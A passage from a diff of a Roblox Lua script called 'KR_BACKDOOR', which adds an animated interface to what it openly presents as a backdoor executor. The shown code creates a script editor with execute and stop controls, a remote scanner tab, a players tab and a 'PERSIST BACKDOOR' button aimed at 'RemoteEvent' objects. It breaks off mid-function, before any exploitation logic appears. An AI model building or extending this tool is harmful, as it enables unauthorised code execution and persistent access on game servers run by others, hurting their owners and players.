@@ -1,15 +1,13 @@
--- [[ KR_BACKDOOR V9.1: ANIMATED PRO EDITION ]] --
 local targetName = "RemoteEvent"
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
 
--- [[ ГАРАНТИРОВАННЫЙ UI PARENT ]] --
 local parentUI = nil
 local success, _ = pcall(function() parentUI = game:GetService("CoreGui") end)
 if not success or not parentUI then parentUI = Players.LocalPlayer:WaitForChild("PlayerGui") end
-
 if parentUI:FindFirstChild("kr_backdoor_v9") then parentUI.kr_backdoor_v9:Destroy() end
 
 local sg = Instance.new("ScreenGui")
@@ -18,179 +16,1513 @@ sg.ResetOnSpawn = false
 sg.DisplayOrder = 999
 sg.Parent = parentUI
 
--- [[ УТИЛИТЫ АНИМАЦИИ ]] --
 local function round(obj, radius)
-    local uic = Instance.new("UICorner")
-    uic.CornerRadius = UDim.new(0, radius or 12)
-    uic.Parent = obj
+	local uic = Instance.new("UICorner")
+	uic.CornerRadius = UDim.new(0, radius or 12)
+	uic.Parent = obj
 end
 
 local function addButtonEffects(button, defaultColor, hoverColor)
-    local scale = Instance.new("UIScale", button)
-    
-    button.MouseEnter:Connect(function()
-        TweenService:Create(button, TweenInfo.new(0.3), {BackgroundColor3 = hoverColor}):Play()
-    end)
-    
-    button.MouseLeave:Connect(function()
-        TweenService:Create(button, TweenInfo.new(0.3), {BackgroundColor3 = defaultColor}):Play()
-    end)
-    
-    button.MouseButton1Down:Connect(function()
-        TweenService:Create(scale, TweenInfo.new(0.1), {Scale = 0.95}):Play()
-    end)
-    
-    button.MouseButton1Up:Connect(function()
-        TweenService:Create(scale, TweenInfo.new(0.1), {Scale = 1}):Play()
-    end)
+	local scale = Instance.new("UIScale", button)
+	button.MouseEnter:Connect(function()
+		TweenService:Create(button, TweenInfo.new(0.3), {BackgroundColor3 = hoverColor}):Play()
+	end)
+	button.MouseLeave:Connect(function()
+		TweenService:Create(button, TweenInfo.new(0.3), {BackgroundColor3 = defaultColor}):Play()
+	end)
+	button.MouseButton1Down:Connect(function()
+		TweenService:Create(scale, TweenInfo.new(0.1), {Scale = 0.95}):Play()
+	end)
+	button.MouseButton1Up:Connect(function()
+		TweenService:Create(scale, TweenInfo.new(0.1), {Scale = 1}):Play()
+	end)
 end
 
--- [[ АНИМАЦИЯ ГРАДИЕНТА ]] --
 local function applyInfernoGradient(obj)
-    local grad = Instance.new("UIGradient")
-    grad.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
-        ColorSequenceKeypoint.new(0.4, Color3.fromRGB(150, 0, 0)),
-        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(220, 20, 0)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
-    })
-    grad.Parent = obj
-    task.spawn(function()
-        local t = 0
-        while grad and grad.Parent do
-            t = t + 0.03
-            grad.Offset = Vector2.new(math.sin(t) * 0.4, 0)
-            grad.Rotation = grad.Rotation + 0.4
-            task.wait()
-        end
-    end)
+	local grad = Instance.new("UIGradient")
+	grad.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
+		ColorSequenceKeypoint.new(0.4, Color3.fromRGB(150, 0, 0)),
+		ColorSequenceKeypoint.new(0.6, Color3.fromRGB(220, 20, 0)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
+	})
+	grad.Parent = obj
+	task.spawn(function()
+		local t = 0
+		while grad and grad.Parent do
+			t = t + 0.03
+			grad.Offset = Vector2.new(math.sin(t) * 0.4, 0)
+			grad.Rotation = grad.Rotation + 0.4
+			task.wait()
+		end
+	end)
 end
 
--- [[ 1. ЗАГРУЗОЧНЫЙ ЭКРАН ]] --
+local notifContainer = Instance.new("Frame", sg)
+notifContainer.Size = UDim2.new(0, 300, 1, 0)
+notifContainer.Position = UDim2.new(1, -310, 0, 10)
+notifContainer.BackgroundTransparency = 1
+notifContainer.ZIndex = 200
+notifContainer.Active = false
+
+local notifLayout = Instance.new("UIListLayout", notifContainer)
+notifLayout.Padding = UDim.new(0, 8)
+notifLayout.VerticalAlignment = Enum.VerticalAlignment.Top
+notifLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+notifLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+local notifOrder = 0
+
+local function notify(text, nType)
+	notifOrder = notifOrder + 1
+	local colors = {
+		success = {bg = Color3.fromRGB(0, 80, 0), accent = Color3.fromRGB(0, 200, 0), icon = ">>"},
+		error = {bg = Color3.fromRGB(100, 0, 0), accent = Color3.fromRGB(255, 50, 50), icon = "!!"},
+		info = {bg = Color3.fromRGB(20, 20, 60), accent = Color3.fromRGB(80, 120, 255), icon = "i"},
+		warn = {bg = Color3.fromRGB(80, 60, 0), accent = Color3.fromRGB(255, 200, 0), icon = "!"},
+	}
+	local c = colors[nType] or colors.info
+
+	local frame = Instance.new("Frame", notifContainer)
+	frame.Size = UDim2.new(1, 0, 0, 40)
+	frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+	frame.BackgroundTransparency = 0.1
+	frame.ZIndex = 201
+	frame.LayoutOrder = notifOrder
+	round(frame, 8)
+
+	local nStroke = Instance.new("UIStroke", frame)
+	nStroke.Color = c.accent
+	nStroke.Thickness = 1
+	nStroke.Transparency = 0.5
+
+	local accentBar = Instance.new("Frame", frame)
+	accentBar.Size = UDim2.new(0, 3, 0.7, 0)
+	accentBar.Position = UDim2.new(0, 6, 0.15, 0)
+	accentBar.BackgroundColor3 = c.accent
+	accentBar.BorderSizePixel = 0
+	accentBar.ZIndex = 202
+	round(accentBar, 2)
+
+	local iconLabel = Instance.new("TextLabel", frame)
+	iconLabel.Size = UDim2.new(0, 22, 0, 22)
+	iconLabel.Position = UDim2.new(0, 14, 0.5, -11)
+	iconLabel.BackgroundColor3 = c.bg
+	iconLabel.Text = c.icon
+	iconLabel.TextColor3 = c.accent
+	iconLabel.Font = Enum.Font.GothamBold
+	iconLabel.TextSize = 10
+	iconLabel.ZIndex = 202
+	round(iconLabel, 6)
+
+	local nText = Instance.new("TextLabel", frame)
+	nText.Size = UDim2.new(1, -50, 1, 0)
+	nText.Position = UDim2.new(0, 42, 0, 0)
+	nText.BackgroundTransparency = 1
+	nText.Text = text
+	nText.TextColor3 = Color3.fromRGB(210, 210, 210)
+	nText.Font = Enum.Font.Gotham
+	nText.TextSize = 11
+	nText.TextXAlignment = Enum.TextXAlignment.Left
+	nText.TextTruncate = Enum.TextTruncate.AtEnd
+	nText.ZIndex = 202
+
+	frame.Position = UDim2.new(1, 0, 0, 0)
+	TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+		Position = UDim2.new(0, 0, 0, 0)
+	}):Play()
+
+	task.delay(3, function()
+		TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+			Position = UDim2.new(1, 20, 0, 0),
+			BackgroundTransparency = 1
+		}):Play()
+		TweenService:Create(nText, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
+		task.delay(0.35, function() frame:Destroy() end)
+	end)
+end
+
 local loader = Instance.new("Frame", sg)
-loader.Size = UDim2.new(0, 380, 0, 160)
-loader.Position = UDim2.new(0.5, -190, 0.5, -80)
+loader.Size = UDim2.new(0, 380, 0, 180)
+loader.Position = UDim2.new(0.5, -190, 0.5, -90)
 loader.BackgroundColor3 = Color3.new(1, 1, 1)
 loader.BorderSizePixel = 0
 loader.ZIndex = 100
 round(loader, 20)
 applyInfernoGradient(loader)
 
-local lTitle = Instance.new("TextLabel", loader)
-lTitle.Size = UDim2.new(1, 0, 0, 90); lTitle.Text = "kr_backdoor"; lTitle.TextColor3 = Color3.new(1, 1, 1); lTitle.Font = "GothamBold"; lTitle.TextSize = 42; lTitle.ZIndex = 101; lTitle.BackgroundTransparency = 1
-local statusLabel = Instance.new("TextLabel", loader)
-statusLabel.Size = UDim2.new(1, 0, 0, 40); statusLabel.Position = UDim2.new(0, 0, 0.65, 0); statusLabel.Text = "Initializing Interface..."; statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200); statusLabel.Font = "GothamMedium"; statusLabel.TextSize = 18; statusLabel.ZIndex = 101; statusLabel.BackgroundTransparency = 1
+local loaderStroke = Instance.new("UIStroke", loader)
+loaderStroke.Color = Color3.fromRGB(200, 30, 0)
+loaderStroke.Thickness = 2
+loaderStroke.Transparency = 0.3
 
--- [[ 2. ГЛАВНОЕ ОКНО ]] --
+local lTitle = Instance.new("TextLabel", loader)
+lTitle.Size = UDim2.new(1, 0, 0, 80)
+lTitle.Text = "kr_backdoor"
+lTitle.TextColor3 = Color3.new(1, 1, 1)
+lTitle.Font = Enum.Font.GothamBold
+lTitle.TextSize = 42
+lTitle.ZIndex = 101
+lTitle.BackgroundTransparency = 1
+
+local statusLabel = Instance.new("TextLabel", loader)
+statusLabel.Size = UDim2.new(1, 0, 0, 30)
+statusLabel.Position = UDim2.new(0, 0, 0, 75)
+statusLabel.Text = "Initializing Interface..."
+statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+statusLabel.Font = Enum.Font.GothamMedium
+statusLabel.TextSize = 16
+statusLabel.ZIndex = 101
+statusLabel.BackgroundTransparency = 1
+
+local loadBarBg = Instance.new("Frame", loader)
+loadBarBg.Size = UDim2.new(0.7, 0, 0, 4)
+loadBarBg.Position = UDim2.new(0.15, 0, 0, 120)
+loadBarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+loadBarBg.ZIndex = 101
+loadBarBg.BorderSizePixel = 0
+round(loadBarBg, 2)
+
+local loadBarFill = Instance.new("Frame", loadBarBg)
+loadBarFill.Size = UDim2.new(0, 0, 1, 0)
+loadBarFill.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+loadBarFill.ZIndex = 102
+loadBarFill.BorderSizePixel = 0
+round(loadBarFill, 2)
+
+local shadow = Instance.new("ImageLabel", sg)
+shadow.Size = UDim2.new(0, 680, 0, 510)
+shadow.Position = UDim2.new(0.5, -340, 0.5, -255)
+shadow.BackgroundTransparency = 1
+shadow.Image = "rbxassetid://5554236805"
+shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+shadow.ImageTransparency = 0.4
+shadow.ScaleType = Enum.ScaleType.Slice
+shadow.SliceCenter = Rect.new(23, 23, 277, 277)
+shadow.Visible = false
+
 local mainFrame = Instance.new("Frame", sg)
 mainFrame.Size = UDim2.new(0, 650, 0, 480)
 mainFrame.Position = UDim2.new(0.5, -325, 0.5, -240)
 mainFrame.BackgroundColor3 = Color3.new(1, 1, 1)
 mainFrame.Visible = false
+mainFrame.ClipsDescendants = true
 round(mainFrame, 15)
 applyInfernoGradient(mainFrame)
-Instance.new("UIStroke", mainFrame).Color = Color3.fromRGB(150, 0, 0)
+
+local mainStroke = Instance.new("UIStroke", mainFrame)
+mainStroke.Color = Color3.fromRGB(200, 30, 0)
+mainStroke.Thickness = 2
+mainStroke.Transparency = 0.2
 
 local header = Instance.new("Frame", mainFrame)
-header.Size = UDim2.new(1, 0, 0, 50); header.BackgroundColor3 = Color3.new(0,0,0); header.BackgroundTransparency = 0.6; round(header, 15)
-local titleLabel = Instance.new("TextLabel", header)
-titleLabel.Size = UDim2.new(1, -20, 1, 0); titleLabel.Position = UDim2.new(0, 15, 0, 0); titleLabel.Text = "KR_BACKDOOR | INFERNAL V9.1"; titleLabel.TextColor3 = Color3.new(1, 1, 1); titleLabel.Font = "GothamBold"; titleLabel.TextSize = 16; titleLabel.TextXAlignment = "Left"; titleLabel.BackgroundTransparency = 1
+header.Size = UDim2.new(1, 0, 0, 50)
+header.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+header.BackgroundTransparency = 0.3
+round(header, 15)
 
--- ПЕРЕДВИЖЕНИЕ
-local function makeDraggable(obj, target)
-    local dragging, dragInput, dragStart, startPos
-    obj.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = true; dragStart = input.Position; startPos = target.Position end end)
-    UserInputService.InputChanged:Connect(function(input) if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then local delta = input.Position - dragStart; target.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) end end)
-    UserInputService.InputEnded:Connect(function() dragging = false end)
+local headerLine = Instance.new("Frame", mainFrame)
+headerLine.Size = UDim2.new(0.96, 0, 0, 1)
+headerLine.Position = UDim2.new(0.02, 0, 0, 50)
+headerLine.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
+headerLine.BackgroundTransparency = 0.5
+headerLine.BorderSizePixel = 0
+
+local titleLabel = Instance.new("TextLabel", header)
+titleLabel.Size = UDim2.new(0, 120, 1, 0)
+titleLabel.Position = UDim2.new(0, 10, 0, 0)
+titleLabel.Text = "KR"
+titleLabel.TextColor3 = Color3.new(1, 1, 1)
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextSize = 18
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.BackgroundTransparency = 1
+
+local verLabel = Instance.new("TextLabel", header)
+verLabel.Size = UDim2.new(0, 42, 0, 18)
+verLabel.Position = UDim2.new(0, 38, 0, 16)
+verLabel.Text = "V10.0"
+verLabel.TextColor3 = Color3.fromRGB(0, 220, 0)
+verLabel.Font = Enum.Font.GothamBold
+verLabel.TextSize = 10
+verLabel.BackgroundColor3 = Color3.fromRGB(0, 40, 0)
+verLabel.BackgroundTransparency = 0.3
+verLabel.TextXAlignment = Enum.TextXAlignment.Center
+round(verLabel, 6)
+
+local visible = false
+local function showMain()
+	shadow.Visible = true
+	mainFrame.Visible = true
+	local mainScale = mainFrame:FindFirstChildOfClass("UIScale")
+	if mainScale then
+		mainScale.Scale = 0.9
+		TweenService:Create(mainScale, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
+	end
+	mainFrame.BackgroundTransparency = 0.3
+	TweenService:Create(mainFrame, TweenInfo.new(0.2), {BackgroundTransparency = 0}):Play()
 end
+
+local function hideMain()
+	local mainScale = mainFrame:FindFirstChildOfClass("UIScale")
+	if mainScale then
+		TweenService:Create(mainScale, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Scale = 0.9}):Play()
+	end
+	TweenService:Create(mainFrame, TweenInfo.new(0.2), {BackgroundTransparency = 0.3}):Play()
+	task.delay(0.2, function()
+		mainFrame.Visible = false
+		shadow.Visible = false
+	end)
+end
+
+local closeBtn = Instance.new("TextButton", header)
+closeBtn.Size = UDim2.new(0, 28, 0, 28)
+closeBtn.Position = UDim2.new(1, -36, 0, 11)
+closeBtn.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
+closeBtn.Text = "X"
+closeBtn.TextColor3 = Color3.new(1, 1, 1)
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.TextSize = 12
+round(closeBtn, 8)
+addButtonEffects(closeBtn, Color3.fromRGB(120, 0, 0), Color3.fromRGB(200, 0, 0))
+
+closeBtn.MouseButton1Click:Connect(function()
+	visible = false
+	hideMain()
+end)
+
+local minimizeBtn = Instance.new("TextButton", header)
+minimizeBtn.Size = UDim2.new(0, 28, 0, 28)
+minimizeBtn.Position = UDim2.new(1, -70, 0, 11)
+minimizeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 0)
+minimizeBtn.Text = "_"
+minimizeBtn.TextColor3 = Color3.new(1, 1, 1)
+minimizeBtn.Font = Enum.Font.GothamBold
+minimizeBtn.TextSize = 12
+round(minimizeBtn, 8)
+addButtonEffects(minimizeBtn, Color3.fromRGB(60, 60, 0), Color3.fromRGB(120, 120, 0))
+
+local minimized = false
+local savedSize
+
+minimizeBtn.MouseButton1Click:Connect(function()
+	minimized = not minimized
+	if minimized then
+		savedSize = mainFrame.Size
+		TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = UDim2.new(0, 650, 0, 52)}):Play()
+		statusBar.Visible = false
+		headerLine.Visible = false
+	else
+		TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = savedSize or UDim2.new(0, 650, 0, 480)}):Play()
+		task.delay(0.15, function()
+			statusBar.Visible = true
+			headerLine.Visible = true
+		end)
+	end
+end)
+
+local function makeDraggable(obj, target)
+	local dragging, dragStart, startPos
+	obj.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = target.Position
+		end
+	end)
+	UserInputService.InputChanged:Connect(function(input)
+		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+			local delta = input.Position - dragStart
+			target.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+			shadow.Position = UDim2.new(target.Position.X.Scale, target.Position.X.Offset - 15, target.Position.Y.Scale, target.Position.Y.Offset - 15)
+		end
+	end)
+	UserInputService.InputEnded:Connect(function() dragging = false end)
+end
+
 makeDraggable(header, mainFrame)
 
--- ТАБЫ
-local pages = {
-    Exec = Instance.new("Frame", mainFrame),
-    Scripts = Instance.new("ScrollingFrame", mainFrame),
-    Scanner = Instance.new("ScrollingFrame", mainFrame)
-}
+local pages = {}
+pages.Exec = Instance.new("Frame", mainFrame)
+pages.Scripts = Instance.new("Frame", mainFrame)
+pages.Players = Instance.new("Frame", mainFrame)
+pages.Console = Instance.new("Frame", mainFrame)
+pages.Scanner = Instance.new("ScrollingFrame", mainFrame)
+pages.Updates = Instance.new("ScrollingFrame", mainFrame)
 
 for name, page in pairs(pages) do
-    page.Size = UDim2.new(1, 0, 1, -60); page.Position = UDim2.new(0, 0, 0, 60); page.BackgroundTransparency = 1; page.Visible = (name == "Exec")
-    if page:IsA("ScrollingFrame") then page.BorderSizePixel = 0; page.ScrollBarThickness = 3; page.ScrollBarImageColor3 = Color3.new(1,1,1) end
+	page.Size = UDim2.new(1, -16, 1, -80)
+	page.Position = UDim2.new(0, 8, 0, 58)
+	page.BackgroundTransparency = 1
+	page.Visible = (name == "Exec")
+	page.ClipsDescendants = true
+	if page:IsA("ScrollingFrame") then
+		page.BorderSizePixel = 0
+		page.ScrollBarThickness = 3
+		page.ScrollBarImageColor3 = Color3.fromRGB(255, 60, 60)
+	end
 end
 
-local function createTab(name, x, page)
-    local b = Instance.new("TextButton", header); b.Size = UDim2.new(0, 100, 0, 30); b.Position = UDim2.new(1, x, 0, 10); b.BackgroundColor3 = Color3.fromRGB(60, 0, 0); b.Text = name; b.TextColor3 = Color3.new(1,1,1); b.Font = "GothamBold"; b.TextSize = 10; round(b, 8)
-    addButtonEffects(b, Color3.fromRGB(60, 0, 0), Color3.fromRGB(120, 0, 0))
-    b.MouseButton1Click:Connect(function() for _, p in pairs(pages) do p.Visible = false end; page.Visible = true end)
+local tabButtons = {}
+local activeTab = nil
+
+local function createTab(name, x, page, w)
+	local b = Instance.new("TextButton", header)
+	b.Size = UDim2.new(0, w or 68, 0, 28)
+	b.Position = UDim2.new(0, x, 0, 11)
+	b.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
+	b.Text = name
+	b.TextColor3 = Color3.fromRGB(160, 160, 160)
+	b.Font = Enum.Font.GothamBold
+	b.TextSize = 8
+	round(b, 8)
+
+	local underline = Instance.new("Frame", b)
+	underline.Size = UDim2.new(0.6, 0, 0, 2)
+	underline.Position = UDim2.new(0.2, 0, 1, -3)
+	underline.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+	underline.BorderSizePixel = 0
+	underline.Visible = false
+
+	tabButtons[name] = {btn = b, line = underline, page = page}
+
+	local defaultCol = Color3.fromRGB(40, 0, 0)
+	local hoverCol = Color3.fromRGB(80, 0, 0)
+	local activeCol = Color3.fromRGB(100, 10, 10)
+
+	b.MouseEnter:Connect(function()
+		if activeTab ~= name then
+			TweenService:Create(b, TweenInfo.new(0.2), {BackgroundColor3 = hoverCol}):Play()
+		end
+	end)
+	b.MouseLeave:Connect(function()
+		if activeTab ~= name then
+			TweenService:Create(b, TweenInfo.new(0.2), {BackgroundColor3 = defaultCol}):Play()
+		end
+	end)
+
+	b.MouseButton1Click:Connect(function()
+		if minimized then return end
+		for tName, tData in pairs(tabButtons) do
+			tData.page.Visible = false
+			tData.line.Visible = false
+			TweenService:Create(tData.btn, TweenInfo.new(0.2), {
+				BackgroundColor3 = defaultCol,
+				TextColor3 = Color3.fromRGB(160, 160, 160)
+			}):Play()
+		end
+		page.Visible = true
+		underline.Visible = true
+		activeTab = name
+		TweenService:Create(b, TweenInfo.new(0.2), {
+			BackgroundColor3 = activeCol,
+			TextColor3 = Color3.new(1, 1, 1)
+		}):Play()
+	end)
 end
-createTab("EXECUTOR", -330, pages.Exec)
-createTab("SCRIPTS", -220, pages.Scripts)
-createTab("SCANNER", -110, pages.Scanner)
 
--- [[ EXECUTOR ]] --
-local editor = Instance.new("TextBox", pages.Exec)
-editor.Size = UDim2.new(0.94, 0, 0, 280); editor.Position = UDim2.new(0.03, 0, 0.05, 0); editor.BackgroundColor3 = Color3.new(0,0,0); editor.TextColor3 = Color3.fromRGB(255, 100, 100); editor.Font = "Code"; editor.TextSize = 14; editor.MultiLine = true; editor.Text = "-- Write script here"; editor.ClearTextOnFocus = false; editor.TextXAlignment = "Left"; editor.TextYAlignment = "Top"; round(editor, 10)
-Instance.new("UIPadding", editor).PaddingLeft = UDim.new(0, 10)
+createTab("EXEC", 90, pages.Exec, 48)
+createTab("SCRIPTS", 142, pages.Scripts, 55)
+createTab("PLAYERS", 201, pages.Players, 55)
+createTab("CONSOLE", 260, pages.Console, 60)
+createTab("SCAN", 324, pages.Scanner, 42)
+createTab("LOG", 370, pages.Updates, 36)
 
-local runBtn = Instance.new("TextButton", pages.Exec); runBtn.Size = UDim2.new(0.45, 0, 0, 50); runBtn.Position = UDim2.new(0.03, 0, 0.85, 0); runBtn.BackgroundColor3 = Color3.fromRGB(0, 80, 0); runBtn.Text = "EXECUTE"; runBtn.TextColor3 = Color3.new(1,1,1); runBtn.Font = "GothamBold"; round(runBtn, 10)
-local clearBtn = Instance.new("TextButton", pages.Exec); clearBtn.Size = UDim2.new(0.45, 0, 0, 50); clearBtn.Position = UDim2.new(0.52, 0, 0.85, 0); clearBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0); clearBtn.Text = "CLEAR"; clearBtn.TextColor3 = Color3.new(1,1,1); clearBtn.Font = "GothamBold"; round(clearBtn, 10)
+activeTab = "EXEC"
+tabButtons["EXEC"].line.Visible = true
+tabButtons["EXEC"].btn.BackgroundColor3 = Color3.fromRGB(100, 10, 10)
+tabButtons["EXEC"].btn.TextColor3 = Color3.new(1, 1, 1)
 
-addButtonEffects(runBtn, Color3.fromRGB(0, 80, 0), Color3.fromRGB(0, 150, 0))
-addButtonEffects(clearBtn, Color3.fromRGB(100, 0, 0), Color3.fromRGB(180, 0, 0))
+local editorBg = Instance.new("Frame", pages.Exec)
+editorBg.Size = UDim2.new(0.94, 0, 0, 238)
+editorBg.Position = UDim2.new(0.03, 0, 0.01, 0)
+editorBg.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
+round(editorBg, 10)
 
--- [[ БИБЛИОТЕКА SCRIPTS ]] --
-local sList = Instance.new("UIListLayout", pages.Scripts); sList.Padding = UDim.new(0, 10); sList.HorizontalAlignment = "Center"
+local editorAccent = Instance.new("Frame", editorBg)
+editorAccent.Size = UDim2.new(0, 3, 0.9, 0)
+editorAccent.Position = UDim2.new(0, 4, 0.05, 0)
+editorAccent.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+editorAccent.BorderSizePixel = 0
+round(editorAccent, 2)
+
+local editorStroke = Instance.new("UIStroke", editorBg)
+editorStroke.Color = Color3.fromRGB(60, 0, 0)
+editorStroke.Thickness = 1
+editorStroke.Transparency = 0.5
+
+local editorScroll = Instance.new("ScrollingFrame", editorBg)
+editorScroll.Size = UDim2.new(1, -18, 1, -22)
+editorScroll.Position = UDim2.new(0, 14, 0, 5)
+editorScroll.BackgroundTransparency = 1
+editorScroll.BorderSizePixel = 0
+editorScroll.ScrollBarThickness = 2
+editorScroll.ScrollBarImageColor3 = Color3.fromRGB(255, 60, 60)
+editorScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+editorScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+
+local editor = Instance.new("TextBox", editorScroll)
+editor.Size = UDim2.new(1, 0, 0, 220)
+editor.BackgroundTransparency = 1
+editor.TextColor3 = Color3.fromRGB(255, 100, 100)
+editor.PlaceholderText = "-- Write your script here..."
+editor.PlaceholderColor3 = Color3.fromRGB(80, 80, 80)
+editor.Font = Enum.Font.Code
+editor.TextSize = 14
+editor.MultiLine = true
+editor.Text = ""
+editor.ClearTextOnFocus = false
+editor.TextXAlignment = Enum.TextXAlignment.Left
+editor.TextYAlignment = Enum.TextYAlignment.Top
+editor.TextWrapped = true
+editor.AutomaticSize = Enum.AutomaticSize.Y
+
+local charCounter = Instance.new("TextLabel", editorBg)
+charCounter.Size = UDim2.new(1, -10, 0, 16)
+charCounter.Position = UDim2.new(0, 5, 1, -18)
+charCounter.BackgroundTransparency = 1
+charCounter.Text = "0 chars | 0 lines"
+charCounter.TextColor3 = Color3.fromRGB(60, 60, 60)
+charCounter.Font = Enum.Font.Code
+charCounter.TextSize = 9
+charCounter.TextXAlignment = Enum.TextXAlignment.Right
+
+editor:GetPropertyChangedSignal("Text"):Connect(function()
+	local text = editor.Text
+	local chars = string.len(text)
+	local lines = 1
+	for _ in string.gmatch(text, "\n") do lines = lines + 1 end
+	charCounter.Text = chars .. " chars | " .. lines .. " lines"
+end)
+
+local btnRow1 = Instance.new("Frame", pages.Exec)
+btnRow1.Size = UDim2.new(0.94, 0, 0, 36)
+btnRow1.Position = UDim2.new(0.03, 0, 0, 248)
+btnRow1.BackgroundTransparency = 1
+
+local runBtn = Instance.new("TextButton", btnRow1)
+runBtn.Size = UDim2.new(0.32, 0, 1, 0)
+runBtn.Position = UDim2.new(0, 0, 0, 0)
+runBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+runBtn.Text = "EXECUTE"
+runBtn.TextColor3 = Color3.fromRGB(0, 220, 0)
+runBtn.Font = Enum.Font.GothamBold
+runBtn.TextSize = 11
+round(runBtn, 6)
+local runS = Instance.new("UIStroke", runBtn)
+runS.Color = Color3.fromRGB(0, 100, 0)
+runS.Thickness = 1
+
+local clearBtn = Instance.new("TextButton", btnRow1)
+clearBtn.Size = UDim2.new(0.2, 0, 1, 0)
+clearBtn.Position = UDim2.new(0.34, 0, 0, 0)
+clearBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+clearBtn.Text = "CLEAR"
+clearBtn.TextColor3 = Color3.fromRGB(180, 60, 60)
+clearBtn.Font = Enum.Font.GothamBold
+clearBtn.TextSize = 10
+round(clearBtn, 6)
+local clearS = Instance.new("UIStroke", clearBtn)
+clearS.Color = Color3.fromRGB(80, 0, 0)
+clearS.Thickness = 1
+
+local stopBtn = Instance.new("TextButton", btnRow1)
+stopBtn.Size = UDim2.new(0.22, 0, 1, 0)
+stopBtn.Position = UDim2.new(0.56, 0, 0, 0)
+stopBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+stopBtn.Text = "STOP"
+stopBtn.TextColor3 = Color3.fromRGB(255, 160, 40)
+stopBtn.Font = Enum.Font.GothamBold
+stopBtn.TextSize = 10
+round(stopBtn, 6)
+local stopS = Instance.new("UIStroke", stopBtn)
+stopS.Color = Color3.fromRGB(100, 60, 0)
+stopS.Thickness = 1
+
+local pasteBtn = Instance.new("TextButton", btnRow1)
+pasteBtn.Size = UDim2.new(0.2, 0, 1, 0)
+pasteBtn.Position = UDim2.new(0.8, 0, 0, 0)
+pasteBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+pasteBtn.Text = "PASTE"
+pasteBtn.TextColor3 = Color3.fromRGB(140, 140, 220)
+pasteBtn.Font = Enum.Font.GothamBold
+pasteBtn.TextSize = 10
+round(pasteBtn, 6)
+local pasteS = Instance.new("UIStroke", pasteBtn)
+pasteS.Color = Color3.fromRGB(50, 50, 100)
+pasteS.Thickness = 1
+
+local persistBtn = Instance.new("TextButton", pages.Exec)
+persistBtn.Size = UDim2.new(0.94, 0, 0, 30)
+persistBtn.Position = UDim2.new(0.03, 0, 0, 290)
+persistBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+persistBtn.Text = "PERSIST BACKDOOR"
+persistBtn.TextColor3 = Color3.fromRGB(255, 160, 40)
+persistBtn.Font = Enum.Font.GothamBold
+persistBtn.TextSize = 10
+round(persistBtn, 6)
+local persistStroke = Instance.new("UIStroke", persistBtn)
+persistStroke.Color = Color3.fromRGB(100, 60, 0)
+persistStroke.Thickness = 1
+
+addButtonEffects(runBtn, Color3.fromRGB(20, 20, 20), Color3.fromRGB(35, 35, 35))
+addButtonEffects(clearBtn, Color3.fromRGB(20, 20, 20), Color3.fromRGB(35, 35, 35))
+addButtonEffects(stopBtn, Color3.fromRGB(20, 20, 20), Color3.fromRGB(35, 35, 35))
+addButtonEffects(pasteBtn, Color3.fromRGB(20, 20, 20), Color3.fromRGB(35, 35, 35))
+
+persistBtn.MouseEnter:Connect(function()
+	if not persisted then
